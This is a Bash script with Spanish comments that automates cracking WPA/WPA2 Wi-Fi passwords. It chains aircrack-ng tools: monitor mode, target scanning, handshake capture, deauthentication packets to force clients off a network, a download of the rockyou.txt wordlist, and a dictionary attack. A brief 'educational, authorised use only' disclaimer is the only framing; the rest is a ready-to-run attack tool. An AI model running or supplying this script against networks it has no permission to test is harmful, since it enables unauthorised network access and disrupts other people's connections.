#!/bin/bash

# DEMO DE CRACKING WIFI CON AIRCRACK-NG
# Script educativo para demostración de seguridad WiFi
# Uso autorizado solo en redes propias o con permiso explícito

# Colores para la salida
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Verificar si se ejecuta como root
if [ "$(id -u)" != "0" ]; then
    echo -e "${RED}[!] Este script debe ejecutarse como root${NC}"
    exit 1
fi

# Verificar dependencias
check_deps() {
    deps=("aircrack-ng" "airodump-ng" "iwconfig" "xterm")
    missing=0
    
    echo -e "${YELLOW}[*] Verificando dependencias...${NC}"
    
    for dep in "${deps[@]}"; do
        if ! command -v $dep &> /dev/null; then
            echo -e "${RED}[!] Falta: $dep${NC}"
            missing=1
        fi
    done
    
    if [ $missing -eq 1 ]; then
        echo -e "${RED}[!] Instala las dependencias faltantes y vuelve a intentar${NC}"
        exit 1
    else
        echo -e "${GREEN}[+] Todas las dependencias están instaladas${NC}"
    fi
}

# Listar interfaces WiFi
list_interfaces() {
    echo -e "${YELLOW}[*] Interfaces de red disponibles:${NC}"
    iwconfig 2>/dev/null | grep -E "^[a-zA-Z0-9]+" | grep -v "no wireless" | awk '{print $1}'
}

# Capturar handshake
capture_handshake() {
    echo -e "${YELLOW}[*] Paso 1: Poner la interfaz en modo monitor${NC}"
    airmon-ng check kill
    airmon-ng start $interface
    
    mon_interface="${interface}mon"
    
    echo -e "${YELLOW}[*] Paso 2: Escanear redes WiFi disponibles${NC}"
    airodump-ng $mon_interface
    
    read -p "Introduce el BSSID del objetivo: " bssid
    read -p "Introduce el canal del objetivo: " channel
    read -p "Nombre para el archivo de captura (sin extensión): " capfile
    
    echo -e "${YELLOW}[*] Paso 3: Capturar handshake (Ctrl+C para detener cuando aparezca 'WPA handshake')${NC}"
    xterm -e "airodump-ng -c $channel --bssid $bssid -w $capfile $mon_interface" &
    airodump_pid=$!
    
    echo -e "${YELLOW}[*] Paso 4: Enviar paquetes de deautenticación para forzar handshake${NC}"
    read -p "¿Quieres enviar paquetes de deautenticación? (y/n): " choice
    if [[ $choice == "y" || $choice == "Y" ]]; then
        read -p "Introduce el BSSID del cliente que deseas deautenticar: " bssid_client
        xterm -e "aireplay-ng -0 3 -a $bssid -c $bssid_client $mon_interface"
    fi
    
    echo -e "${YELLOW}[*] Esperando handshake...${NC}"
    echo -e "${YELLOW}[*] Presiona Enter cuando aparezca 'WPA handshake' en la otra ventana${NC}"
    read -p ""
    
    kill $airodump_pid
    airmon-ng stop $mon_interface
    
    if [ -f "${capfile}-01.cap" ]; then
        echo -e "${GREEN}[+] Handshake capturado en ${capfile}-01.cap${NC}"
        capfile="${capfile}-01.cap"
    else
        echo -e "${RED}[!] No se pudo capturar el handshake${NC}"
        exit 1
    fi
}

# Crackear contraseña
crack_password() {
    echo -e "${YELLOW}[*] Paso 5: Crackear la contraseña${NC}"
    
    if [ ! -f "rockyou.txt" ]; then
        echo -e "${YELLOW}[*] Descargando diccionario rockyou.txt...${NC}"
        wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
    fi
    
    echo -e "${YELLOW}[*] Iniciando ataque con aircrack-ng...${NC}"
    aircrack-ng -w rockyou.txt $capfile
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] ¡Contraseña encontrada!${NC}"
    else
        echo -e "${RED}[!] La contraseña no se encontró en el diccionario${NC}"
    fi
}

# Limpieza
cleanup() {
    echo -e "${YELLOW}[*] Limpiando...${NC}"
    airmon-ng check kill
    rm -f *.csv *.netxml
    service network-manager restart
}

# Menú principal
main() {
    clear
    airmon-ng check kill
    echo -e "${GREEN}"
    echo "=============================================="
    echo "     CRACKING WIFI WPA/WPA2 CON AIRCRACK      "
    echo "       (SOLO PARA FINES EDUCATIVOS)           "
    echo "=============================================="
    echo -e "${NC}"
    
    check_deps
    
    echo -e "\n${YELLOW}Selecciona la interfaz WiFi para usar:${NC}"
    list_interfaces
    read -p "Introduce el nombre de la interfaz (ej: wlan0): " interface
    
    capture_handshake
    crack_password
    cleanup
}

main
